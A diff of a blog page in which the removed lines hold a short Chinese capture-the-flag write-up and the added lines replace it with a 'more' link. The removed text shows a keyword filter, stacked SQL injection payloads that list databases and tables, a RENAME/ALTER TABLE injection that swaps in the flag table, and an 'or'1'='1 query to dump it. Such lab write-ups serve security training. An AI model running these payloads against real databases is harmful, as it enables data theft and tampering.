@@ -200,13 +200,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);过滤了括号内的东西<br>?a=1#返回正常</p>
-<p>考虑用堆叠注入</p>
-<p>堆叠查询 id=1’;show databases;’爆出数据库内容<br>id=1’;show tables;’爆出所有表名</p>
-<p>因为alert,rename没有被过滤，可以改变表名</p>
-<p>/?inject=1’;RENAME TABLE <code>words</code> TO <code>words1</code>;RENAME TABLE <code>1919810931114514</code> TO <code>words</code>;ALTER TABLE <code>words</code> CHANGE <code>flag</code> <code>id</code> VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</p>
-<p>最后直接通过i’or’1’=’1可以爆出flag</p>
-
+        <p>return preg_match
       
     </div>
     
@@ -222,6 +216,10 @@
       
       <div class="clearfix"></div>
     </div>
+      
+        <p class="article-more-link">
+          <a  href="/2020/01/12/sql1/#more">more >></a>
+        </p>
       
     
   </div>
